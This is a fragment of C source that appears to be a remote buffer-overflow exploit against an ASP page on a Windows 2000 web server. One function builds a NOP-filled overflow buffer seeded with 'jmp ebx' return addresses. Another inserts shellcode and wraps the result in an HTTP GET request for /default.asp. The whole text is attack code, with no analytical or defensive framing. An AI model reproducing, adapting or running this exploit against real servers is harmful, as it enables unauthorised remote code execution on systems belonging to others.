


int  getoverbuff(char *overbuff)
{

 //*********************************************************************************************
  
  char  *eipretwin2000add=eipretwin2000;
  char  *eipjmpespwin2000add=eipjmpespwin2000;
  char  *eipjmpebxwin2000add=eipjmpebxwin2000;
  char  *eipjmpeaxwin2000add=eipjmpeaxwin2000;

  //*********************************************************************************************

  
 

  char  buff[BUFFSIZE];
//  char  widecharbuff[0x100];
  int   i,j,k,l;

  memset(buff,NOPCODE,BUFFSIZE);

  

 for(i=0x124;i<=0x200;i+=8){
   memcpy(buff+offset+i,"\x42\x42\x42\x2d",4);  //  0x2d  sub eax,num32
   memcpy(buff+offset+i+4,eipjmpebxwin2000,4);
  }     
 for(i=0x404;i<=0x500;i+=8){
   memcpy(buff+offset+i,"\x42\x42\x42\x2d",4);  //  0x2d  sub eax,num32
   memcpy(buff+offset+i+4,eipjmpebxwin2000,4);
  }
 
 for(i=0x220;i<=0x380;i+=8){
   memcpy(buff+offset+i,"\x42\x42\x42\x2d",4);  //  0x2d  sub eax,num32
   memcpy(buff+offset+i+4,eipjmpebxwin2000,4);
  }     
 for(i=0x580;i<=0x728;i+=8){
   memcpy(buff+offset+i,"\x42\x42\x42\x2d",4);  //  0x2d  sub eax,num32
   memcpy(buff+offset+i+4,eipjmpebxwin2000,4);
  }     

  strcpy(buff+0x10000-4,".asp");
 
  strcpy(overbuff,buff);
  return strlen(buff);
}



int  GetOverStr(char *buffer,char *server,char *urlfile,int offset2)
{

  char    findshellcodebuff[BUFFSIZE];
  char    shellcodebuff[BUFFSIZE];
  char    overbuff[BUFFSIZE];
  int     i,findshellbytes,postbytes;

  char    *url="/default.asp";

  char    overstr[]="GET %s%s?koko HTTP/1.1\r\nHOST:%s\r\nContent-Type: text/html\r\n\r\n";
 
  if(urlfile!=NULL) url=urlfile;

  offset=offset-strlen(url)-4;

  i=getoverbuff(overbuff);
 // findshellbytes=GetFindShellcode(findshellcodebuff);
  postbytes=GetShellcode(shellcodebuff);
  memcpy(overbuff+0x730,shellcodebuff,postbytes);

  _snprintf(buffer,BUFFSIZE,overstr,url,overbuff,server); //,i,overbuff); //,shellcodebuff);
 
 // strcpy(buffer+strlen(buffer)+1,shellcodebuff);

  return (strlen(buffer)); //+postbytes+1);
}


